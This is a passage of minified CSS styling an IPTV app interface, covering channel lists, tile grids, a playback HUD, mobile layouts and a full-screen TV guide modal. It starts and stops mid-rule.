no-repeat 50% 50%;background-size:contain}.iptv-program.focus .iptv-program__time::after{content:'';position:absolute;top:0;width:2.4em;left:0;background-color:rgba(255,255,255,0.2);height:1.4em;-webkit-border-radius:.2em;border-radius:.2em}.iptv-hud{position:absolute;top:0;left:0;width:100%;height:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;line-height:1.3}.iptv-hud__content{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding-left:1.5em;padding-right:1.5em;padding-top:7em;padding-bottom:14em}.iptv-hud__menu,.iptv-hud__program{background-color:rgba(0,0,0,0.6);-webkit-border-radius:.5em;border-radius:.5em;padding:1em;overflow:hidden;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.iptv-hud__menu>div,.iptv-hud__program>div{width:100%;overflow:hidden}.iptv-hud__menu{width:22%;margin-right:1.5em}.iptv-hud__program{width:40%}.iptv-hud-menu-info{margin-bottom:1em}.iptv-hud-menu-info__group{opacity:.5}.iptv-hud-menu-info__name{line-height:1.6;font-size:1.8em}.iptv-hud-menu-button{padding:1em;-webkit-border-radius:.3em;border-radius:.3em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;background-color:rgba(255,255,255,0.06)}.iptv-hud-menu-button__icon{margin-right:1em}.iptv-hud-menu-button__icon>svg{width:1.6em !important;height:1.6em !important}.iptv-hud-menu-button__icon .active-layer{opacity:0}.iptv-hud-menu-button__text{font-size:1.3em}.iptv-hud-menu-button.focus{background-color:#fff;color:#000}.iptv-hud-menu-button.active .active-layer{opacity:1}.iptv-hud-menu-button+.iptv-hud-menu-button{margin-top:.5em}.iptv-list-empty{border:.2em dashed rgba(255,255,255,0.5);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;height:12em;-webkit-border-radius:1em;border-radius:1em}.iptv-link{display:inline-block;padding:.1em .5em;-webkit-border-radius:.2em;border-radius:.2em;background-color:rgba(255,255,255,0.1)}.iptv-param-lock{position:absolute;top:50%;right:1.5em;margin-top:-1em;opacity:.5}.iptv-param-lock>svg{width:2em;height:2em}body.platform--orsay .iptv-menu__list-item{padding-right:2.7em}body.platform--orsay .iptv-menu__list-item>span{position:absolute;top:.5em;right:1em}body.platform--orsay .modal.mds-tvg-modal .modal__back,body.platform--orsay .modal:has(.mds-tvg) .modal__back,body.platform--tizen .modal.mds-tvg-modal .modal__back,body.platform--tizen .modal:has(.mds-tvg) .modal__back{display:none !important;background:transparent !important;opacity:0 !important}body.platform--orsay .modal.mds-tvg-modal,body.platform--orsay .modal:has(.mds-tvg),body.platform--tizen .modal.mds-tvg-modal,body.platform--tizen .modal:has(.mds-tvg){background:transparent !important}body.platform--orsay .modal.mds-tvg-modal .modal__content,body.platform--orsay .modal:has(.mds-tvg) .modal__content,body.platform--orsay .modal.mds-tvg-modal .modal__body,body.platform--orsay .modal:has(.mds-tvg) .modal__body,body.platform--tizen .modal.mds-tvg-modal .modal__content,body.platform--tizen .modal:has(.mds-tvg) .modal__content,body.platform--tizen .modal.mds-tvg-modal .modal__body,body.platform--tizen .modal:has(.mds-tvg) .modal__body{background:transparent !important}.mds-tvg--fullscreen{position:fixed !important;top:0 !important;left:0 !important;right:0 !important;bottom:0 !important;width:100% !important;height:100% !important;z-index:999999 !important;background:#0f1623 !important;display:-webkit-box !important;display:-webkit-flex !important;display:-ms-flexbox !important;display:flex !important;-webkit-box-orient:vertical !important;-webkit-flex-direction:column !important;-ms-flex-direction:column !important;flex-direction:column !important}body.light--version .iptv-content{font-size:.9em}body.light--version .iptv-channel{-webkit-border-radius:.3em;border-radius:.3em}body.light--version .iptv-channel::before{-webkit-border-radius:.6em;border-radius:.6em}.iptv-mobile .iptv-content{display:block;padding:0}.iptv-mobile .iptv-content__menu,.iptv-mobile .iptv-content__channels,.iptv-mobile .iptv-content__details{width:100%;padding:0}.iptv-mobile .iptv-menu__list{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.iptv-mobile .iptv-menu__list>div+div{margin:0;margin-left:.5em}.iptv-mobile .iptv-menu__list-item{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.iptv-mobile .iptv-menu__head{display:none}.iptv-mobile .iptv-channels{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding:0}.iptv-mobile .iptv-channel{padding-bottom:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;width:14em;height:10em}@media screen and (max-width:400px){.iptv-mobile .iptv-channel{width:11em;height:8em}.iptv-mobile .iptv-channel .iptv-channel__simb{font-size:3.2em}}.iptv-mobile .iptv-channel__chn{display:none}.iptv-mobile .iptv-channel+.iptv-channel{margin:0;margin-left:1em}.iptv-mobile .iptv-content__details{padding:0 1.5em}.iptv-mobile .iptv-details{padding-top:0;height:48vh}@media screen and (max-width:500px){.iptv-mobile .iptv-details__title{font-size:2.5em}}body.platform--browser .iptv-hud__menu,body.platform--browser .iptv-hud__program,body.platform--nw .iptv-hud__menu,body.platform--nw .iptv-hud__program{background-color:rgba(0,0,0,0.3);-webkit-backdrop-filter:blur(1em);backdrop-filter:blur(1em)}body.glass--style-opacity--medium .iptv-hud__menu,body.glass--style-opacity--medium .iptv-hud__program{background-color:rgba(0,0,0,0.6)}body.glass--style-opacity--blacked .iptv-hud__menu,body.glass--style-opacity--blacked .iptv-hud__program{background-color:rgba(0,0,0,0.85)}.mds-iptv-modss.iptv-content--tiles{padding:0 1.5em}.mds-iptv-modss.iptv-content--tiles .iptv-content__channels{width:70%;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1}@media screen and (max-width:900px){.mds-iptv-modss.iptv-content--tiles .iptv-content__channels{width:72%}}.mds-iptv-modss.iptv-content--tiles .iptv-content__details{display:none !important}.mds-iptv-modss.iptv-content .iptv-content__menu{padding-right:1.5em}.mds-iptv-modss.iptv-content .iptv-content__icons-wrap,.mds-iptv-modss.iptv-content .iptv-content__tiles-wrap{display:none;width:100%;height:100%}.mds-iptv-modss.iptv-content .iptv-content__icons-wrap .iptv-channels{display:block}.mds-iptv-modss.iptv-content:not(.iptv-content--tiles) .iptv-content__icons-wrap{display:block}.mds-iptv-modss.iptv-content.iptv-content--tiles .iptv-content__tiles-wrap{display:block}.iptv-mobile .mds-iptv-modss .iptv-content{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding:0;overflow:hidden}.iptv-mobile .mds-iptv-modss .iptv-content__menu{width:100%;padding:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.iptv-mobile .mds-iptv-modss .iptv-content__channels{width:100%;padding:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;max-height:12em}.iptv-mobile .mds-iptv-modss .iptv-content__channels .scroll{height:12em !important}.iptv-mobile .mds-iptv-modss .iptv-content__channels .scroll.scroll--horizontal{padding-top:0 !important;padding-bottom:0 !important}.iptv-mobile .mds-iptv-modss .iptv-content__details{width:100%;padding:0 1.5em;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:15em;overflow:auto}.iptv-mobile .mds-iptv-modss .iptv-content__tiles-wrap{display:none !important}.iptv-mobile .mds-iptv-modss .iptv-content__details{display:block !important}.iptv-mobile .mds-iptv-modss .iptv-content--tiles .iptv-content__icons-wrap{display:block !important}.iptv-mobile .mds-iptv-modss .iptv-menu__list{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.iptv-mobile .mds-iptv-modss .iptv-menu__list>div+div{margin:0;margin-left:.5em}.iptv-mobile .mds-iptv-modss .iptv-menu__list-item{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.iptv-mobile .mds-iptv-modss .iptv-menu__head{display:none}.iptv-mobile .mds-iptv-modss .iptv-content__channels .scroll--horizontal .scroll__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.iptv-mobile .mds-iptv-modss .iptv-channels{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-wrap:nowrap;-ms-flex-wrap:nowrap;flex-wrap:nowrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.5em !important}.iptv-mobile .mds-iptv-modss .iptv-channels--compact .iptv-channel{width:10em !important;height:7em !important}@media screen and (max-width:400px){.iptv-mobile .mds-iptv-modss .iptv-channels--compact .iptv-channel{width:8em !important;height:6em !important}}.iptv-mobile .mds-iptv-modss .iptv-channels--large .iptv-channel{width:18em !important;height:12em !important}@media screen and (max-width:400px){.iptv-mobile .mds-iptv-modss .iptv-channels--large .iptv-channel{width:14em !important;height:10em !important}}.iptv-mobile .mds-iptv-modss .iptv-channel{padding-bottom:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;width:14em;height:10em}@media screen and (max-width:400px){.iptv-mobile .mds-iptv-modss .iptv-channel{width:11em;height:8em}.iptv-mobile .mds-iptv-modss .iptv-channel .iptv-channel__simb{font-size:1.4em}}.iptv-mobile .mds-iptv-modss .iptv-channel__chn{display:none}.iptv-mobile .mds-iptv-modss .iptv-channel+.iptv-channel{margin:0;margin-left:1em}.iptv-mobile .mds-iptv-modss .iptv-details{padding-top:0;min-height:12em;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;overflow:hidden}.iptv-mobile .mds-iptv-modss .iptv-details__program{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;overflow-y:auto;min-height:8em}.iptv-mobile .mds-iptv-modss .iptv-details__title{font-size:2em}@media screen and (max-width:500px){.iptv-mobile .mds-iptv-modss .iptv-details__title{font-size:1.6em}}@media screen and (max-width:729px){.mds-iptv-modss .iptv-content__tiles-wrap{display:none !important}.mds-iptv-modss .iptv-content__details{display:block !important}.mds-iptv-modss .iptv-content--tiles .iptv-content__icons-wrap{display:block !important}.mds-iptv-modss .iptv-content__channels .scroll .scroll__body{display:-webkit-box !important;display:-webkit-flex !important;display:-ms-flexbox !important;display:flex !important}.mds-iptv-modss .iptv-channels{display:-webkit-box !important;display:-webkit-flex !important;display:-ms-flexbox !important;display:flex !important;-webkit-box-orient:horizontal !important;-webkit-box-direction:normal !important;-webkit-flex-direction:row !important;-ms-flex-direction:row !important;flex-direction:row !important;-webkit-flex-wrap:nowrap !important;-ms-flex-wrap:nowrap !important;flex-wrap:nowrap !important;-webkit-box-align:center !important;-webkit-align-items:center !important;-ms-flex-align:center !important;align-items:center !important;padding:.5em !important}.mds-iptv-modss .iptv-channel{padding-bottom:0 !important;-webkit-flex-shrink:0 !important;-ms-flex-negative:0 !important;flex-shrink:0 !important;width:14em !important;height:10em !important}.mds-iptv-modss .iptv-channel__chn{display:none !important}.mds-iptv-modss .iptv-channel+.iptv-channel{margin:0 !important;margin-left:1em !important}}.iptv-menu__list .mds-view-switch--menu-item{color:#fff;background-color:rgba(255,255,255,0.12);opacity:1}.iptv-menu__list .mds-view-switch--menu-item.focus,.iptv-menu__list .mds-view-switch--menu-item.hover{color:#000;background-color:#fff}.iptv-menu__list .mds-view-switch--menu-item.focus [stroke],.iptv-menu__list .mds-view-switch--menu-item.hover [stroke]{stroke:#000}.iptv-menu__list .mds-view-switch--menu-item.focus path[fill],.iptv-menu__list .mds-view-switch--menu-item.focus rect[fill],.iptv-menu__list .mds-view-switch--menu-item.focus circle[fill],.iptv-menu__list .mds-view-switch--menu-item.hover path[fill],.iptv-menu__list .mds-view-switch--menu-item.hover rect[fill],.iptv-menu__list .mds-view-switch--menu-item.hover circle[fill]{fill:#000}.mds-iptv-tiles{display:-webkit-box !important;display:-webkit-flex !important;display:-ms-flexbox !important;display:flex !important;-webkit-flex-wrap:wrap !important;-ms-flex-wrap:wrap !important;flex-wrap:wrap !important;-webkit-box-align:center !important;-webkit-align-items:center !important;-ms-flex-align:center !important;align-items:center !important;padding:.8em !important;-webkit-align-content:flex-start !important;-ms-flex-line-pack:start !important;align-content:flex-start !important;overflow:visible;margin:-0.5em}.mds-iptv-tiles>*{margin:.5em}@supports(gap:1em){.mds-iptv-tiles{margin:0;gap:1em}.mds-iptv-tiles>*{margin:0}}@media screen and (max-width:1200px){@supports(gap:.9em){.mds-iptv-tiles{gap:.9em}}}.mds-iptv-tile{width:23%;min-width:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;background-color:#464646;-webkit-border-radius:.7em;border-radius:.7em;overflow:hidden;position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;outline:0}@supports(width:calc(25% - 0.75em)) { .mds-iptv-tile { width: -webkit-calc(25% - 0.75em);width:calc(25% - 0.75em)}@media screen and (max-width:1200px){.mds-iptv-tile{width:-webkit-calc(25% - 0.68em);width:calc(25% - 0.68em)}}}@media screen and (max-width:1200px){.mds-iptv-tile{width:-webkit-calc(25% - 0.68em);width:calc(25% - 0.68em)}}.mds-iptv-tile__body{width:100% !important;height:5.8em !important;display:-webkit-box !important;display:-webkit-flex !important;display:-ms-flexbox !important;display:flex !important;-webkit-box-align:center !important;-webkit-align-items:center !important;-ms-flex-align:center !important;align-items:center !important;-webkit-box-pack:center !important;-webkit-justify-content:center !important;-ms-flex-pack:center !important;justify-content:center !important;overflow:hidden !important;background:transparent !important;position:relative !important;padding:.3em !important;-webkit-flex-shrink:0 !important;-ms-flex-negative:0 !important;flex-shrink:0 !important;-webkit-border-radius:.7em .7em 0 0 !important;border-radius:.7em .7em 0 0 !important}.mds-iptv-tile__ico{max-width:100%;max-height:100%;-o-object-fit:contain;object-fit:contain}.mds-iptv-tile__simb{font-size:2.5em;font-weight:900;line-height:.7}.mds-iptv-tile__name{font-size:1em;text-align:center}.mds-iptv-tile__info{padding:.3em .6em;background:rgba(0,0,0,0.35);-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;min-height:3em}.mds-iptv-tile__prog{font-size:.95em;font-weight:400;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;margin-bottom:.25em}.mds-iptv-tile__bar{height:.2em;background:rgba(255,255,255,0.25);-webkit-border-radius:.1em;border-radius:.1em;overflow:hidden}.mds-iptv-tile__bar>div{height:100%;background:#fff;-webkit-border-radius:.1em;border-radius:.1em;-webkit-transition:width .3s;-o-transition:width .3s;transition:width .3s}.mds-iptv-tile__icons{position:absolute;top:.5em;right:.5em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;z-index:2}.mds-iptv-tile__icons>svg{width:1.1em !important;height:1.1em !important;margin-left:.4em}.mds-iptv-tile.focus,.mds-iptv-tile.active{-webkit-box-shadow:0 0 0 .35em #e8e4dc;box-shadow:0 0 0 .35em #e8e4dc;z-index:2;-webkit-transition:-webkit-box-shadow .15s ease;transition:-webkit-box-shadow .15s ease;-o-transition:box-shadow .15s ease;transition:box-shadow .15s ease;transition:box-shadow .15s ease,-webkit-box-shadow .15s ease}.mds-iptv-tile.focus{-webkit-box-shadow:0 0 0 .4em #f5f0e6;box-shadow:0 0 0 .4em #f5f0e6}.mds-iptv-tile.loaded .mds-iptv-tile__ico{opacity:1}.mds-iptv-tile.small--icon .mds-iptv-tile__body{padding:.5em !important}.iptv-mobile .mds-iptv-modss .iptv-content__tiles-wrap{display:none !important}.iptv-mobile .mds-iptv-modss .iptv-content__details{display:block !important}.iptv-mobile .mds-iptv-modss .iptv-content--tiles .iptv-content__icons-wrap{display:block !important}.iptv-mobile .mds-iptv-modss .iptv-content__channels{max-height:12em}.iptv-mobile .mds-iptv-modss .iptv-content__channels .scroll{height:12em !important}.iptv-mobile .mds-iptv-modss .iptv-content__channels .scroll.scroll--horizontal{padding-top:0 !important;padding-bottom:0 !important}.iptv-mobile .mds-iptv-modss .iptv-content__channels .scroll--horizontal .scroll__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}@media screen and (max-width:729px){.mds-iptv-modss .iptv-content__tiles-wrap{display:none !important}.mds-iptv-modss .iptv-content__details{display:block !important}.mds-iptv-modss .iptv-content--tiles .iptv-content__icons-wrap{display:block !important}.mds-iptv-modss .iptv-content__channels .scroll .scroll__body{display:-webkit-box !important;display:-webkit-flex !important;display:-ms-flexbox !important;display:flex !important}}body.mds-tvg-open .bell{width:38em;margin-left:-19em}@media screen and (max-width:729px){body.mds-tvg-open .bell{width:92%;margin-left:-46%}}.modal.mds-tvg-modal,.modal:has(.mds-tvg){padding:0 !important;width:100% !important;height:100% !important;min-height:100%;background:transparent !important}.modal.mds-tvg-modal .modal__back,.modal:has(.mds-tvg) .modal__back{display:none !important;background:transparent !important}.modal.mds-tvg-modal .modal__content,.modal:has(.mds-tvg) .modal__content,.modal.mds-tvg-modal .modal__body,.modal:has(.mds-tvg) .modal__body,.modal.mds-tvg-modal .modal__body .scroll,.modal:has(.mds-tvg) .modal__body .scroll,.modal.mds-tvg-modal .modal__body .scroll__content,.modal:has(.mds-tvg) .modal__body .scroll__content,.modal.mds-tvg-modal .modal__body .scroll__body,.modal:has(.mds-tvg) .modal__body .scroll__body{background:transparent !important}.modal.mds-tvg-modal .modal__content,.modal:has(.mds-tvg) .modal__content{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;min-height:0;width:100% !important;max-width:100% !important;height:100% !important;min-height:100%}.modal.mds-tvg-modal .modal__body,.modal:has(.mds-tvg) .modal__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;min-height:0;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;height:100%;min-height:0}.modal.mds-tvg-modal .modal__body .scroll,.modal:has(.mds-tvg) .modal__body .scroll{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.modal.mds-tvg-modal .modal__body .scroll__content,.modal:has(.mds-tvg) .modal__body .scroll__content{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1 !important;flex:1 !important;min-height:0;padding:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-height:none !important}.modal.mds-tvg-modal .modal__body .scroll__body,.modal:has(.mds-tvg) .modal__body .scroll__body{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.mds-tvg{position:fixed !important;top:0 !important;left:0 !important;right:0 !important;bottom:0 !important;width:100vw !important;width:100% !important;height:100vh !important;height:100% !important;z-index:99999 !important;background:#0f1623 !important;overflow:hidden !important;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;color:#e8e8ec;font-size:1em}.mds-tvg__hd{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.7em 1.2em;background:#152238;border-bottom:1px solid rgba(255,255,255,0.08);-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.mds-tvg__hd>*+*{margin-left:1em}@supports(gap:1em){.mds-tvg__hd{gap:1em}.mds-tvg__hd>*+*{margin-left:0}}.mds-tvg__title{font-size:1.4em;font-weight:600;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;letter-spacing:.03em;color:#fff}.mds-tvg__clock{font-size:.95em;font-variant-numeric:tabular-nums;color:rgba(255,255,255,0.9);font-weight:500}.mds-tvg__back{padding:.5em 1em;-webkit-border-radius:.5em;border-radius:.5em;font-size:.95em;background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.9);cursor:pointer;-webkit-transition:background .2s,color .2s;-o-transition:background .2s,color .2s;transition:background .2s,color .2s}.mds-tvg__back:hover,.mds-tvg__back.focus{background:#4a9eff;color:#fff}.mds-tvg__top{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;background:#152238;border-bottom:1px solid rgba(255,255,255,0.08);min-height:0}.mds-tvg__bd{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;overflow:hidden;position:relative}@supports(display:grid){.mds-tvg__bd{display:grid;grid-template-columns:15em 1fr}}.mds-tvg__ch{width:15em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background:#152238;border-right:1px solid rgba(255,255,255,0.04);z-index:4}@supports(display:grid){.mds-tvg__ch{width:auto;grid-column:1;display:grid;grid-template-rows:3.3em 1fr}}.mds-tvg__ch-hd{height:3.3em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:0 .5em;font-size:.85em;color:rgba(255,255,255,0.6);border-bottom:1px solid rgba(255,255,255,0.04)}@supports(display:grid){.mds-tvg__ch-hd{grid-row:1;height:auto}}.mds-tvg__ch-wrap{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;overflow:hidden;position:relative;min-height:0}@supports(display:grid){.mds-tvg__ch-wrap{grid-row:2;-webkit-box-flex:0;-webkit-flex:none;-ms-flex:none;flex:none}}.mds-tvg__ch-list{position:absolute;top:0;left:0;right:0}.mds-tvg__row{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:flex-start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start;padding:.25em .35em;overflow:hidden;-webkit-transition:background .15s;-o-transition:background .15s;transition:background .15s;margin:0}.mds-tvg__row>*+*{margin-left:.35em}@supports(gap:.35em){.mds-tvg__row{gap:.35em}.mds-tvg__row>*+*{margin-left:0}}.mds-tvg__row--ch{cursor:pointer;min-height:2.8em;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:start;-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start}.mds-tvg__row--ch.hl{background:rgba(74,158,255,0.25);color:#fff}.mds-tvg__row--ch.hl .mds-tvg__num{background:#6bb3ff;color:#fff}.mds-tvg__row--ch.hl .mds-tvg__logo img,.mds-tvg__row--ch.hl .mds-tvg__logo span{-webkit-filter:brightness(1.1);filter:brightness(1.1)}.mds-tvg__row--ch.mds-tvg__row--ch-zone{-webkit-box-shadow:inset 0 0 0 2px #6bb3ff;box-shadow:inset 0 0 0 2px #6bb3ff}.mds-tvg__num{width:0;height:0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:none;position:relative}.mds-tvg__num .mds-tvg__num-check{display:none;position:absolute;top:-0.9em;left:-1.8em;-webkit-transform:none;-ms-transform:none;transform:none;font-size:1.2em;color:#4ade80;font-weight:bold;text-shadow:0 0 4px rgba(0,0,0,0.5)}.mds-tvg__row--ch.hl .mds-tvg__num .mds-tvg__num-check{display:none}.mds-tvg__row--ch.playing .mds-tvg__num{display:block}.mds-tvg__row--ch.playing .mds-tvg__num .mds-tvg__num-n{display:none}.mds-tvg__row--ch.playing .mds-tvg__num .mds-tvg__num-check{display:block}.mds-tvg__logo{width:2em;height:1.8em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;overflow:visible;background:rgba(255,255,255,0.06);position:relative}.mds-tvg__logo img{max-width:100%;max-height:100%;-o-object-fit:contain;object-fit:contain}.mds-tvg__logo span{font-size:.65em;font-weight:700;color:rgba(255,255,255,0.5)}.mds-tvg__row--ch.playing .mds-tvg__logo::after{content:'✓';position:absolute;top:-3px;right:-3px;font-size:.95em;color:#fff;font-weight:900;text-shadow:0 0 3px rgba(0,0,0,0.6);background:#22c55e;-webkit-border-radius:50%;border-radius:50%;width:1.1em;height:1.1em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;line-height:1;-webkit-box-shadow:0 1px 3px rgba(0,0,0,0.4);box-shadow:0 1px 3px rgba(0,0,0,0.4)}.mds-tvg__ch-name{font-size:.9em;font-weight:500;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;line-height:1.3;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-width:0}.mds-tvg__rt{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-width:0;min-height:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;overflow:hidden;position:relative}@supports(display:grid){.mds-tvg__rt{grid-column:2;-webkit-box-flex:0;-webkit-flex:none;-ms-flex:none;flex:none;display:grid;grid-template-rows:3.3em 1fr}}.mds-tvg__tl{height:3.3em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;overflow:hidden;border-bottom:1px solid rgba(255,255,255,0.04);background:#152238;z-index:3;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}@supports(display:grid){.mds-tvg__tl{grid-row:1;height:auto}}.mds-tvg__tl-in{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;position:relative;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;height:100%;min-height:0;-webkit-box-align:stretch;-webkit-align-items:stretch;-ms-flex-align:stretch;align-items:stretch}.mds-tvg__tm{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-align-self:stretch;align-self:stretch;height:100%;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .5em;font-size:1em;-webkit-font-feature-settings:'tnum';font-variant-numeric:tabular-nums;color:rgba(255,255,255,0.4);border-right:1px solid rgba(255,255,255,0.06)}.mds-tvg__tm.now{color:#6bb3ff;font-weight:600;font-size:1.05em;background:rgba(74,158,255,0.15)}.mds-tvg__grid{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-height:0;overflow:hidden;position:relative}@supports(display:grid){.mds-tvg__grid{grid-row:2;-webkit-box-flex:0;-webkit-flex:none;-ms-flex:none;flex:none}}.mds-tvg__gi{position:relative}.mds-tvg__row--prog{position:absolute;left:0;right:0}.mds-tvg__prog{position:absolute;-webkit-box-sizing:border-box;box-sizing:border-box;padding:.25em .4em;overflow:hidden;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;background:rgba(255,255,255,0.12);-webkit-transition:background .15s,box-shadow .15s;-webkit-transition:background .15s,-webkit-box-shadow .15s;transition:background .15s,-webkit-box-shadow .15s;-o-transition:background .15s,box-shadow .15s;transition:background .15s,box-shadow .15s;transition:background .15s,box-shadow .15s,-webkit-box-shadow .15s;min-height:1.8em}.mds-tvg__prog:active{background:rgba(255,255,255,0.1)}.mds-tvg__prog.focus{background:rgba(74,158,255,0.25) !important;outline:2px solid #4a9eff;outline-offset:-2px;z-index:2}.mds-tvg__prog.now{background:rgba(255,255,255,0.07)}.mds-tvg__prog-progress{position:absolute;bottom:0;left:0;height:3px;background:#4ade80;display:none}.mds-tvg__prog.past{opacity:.4}.mds-tvg__prog.mds-tvg__prog--reminded{border-left:3px solid 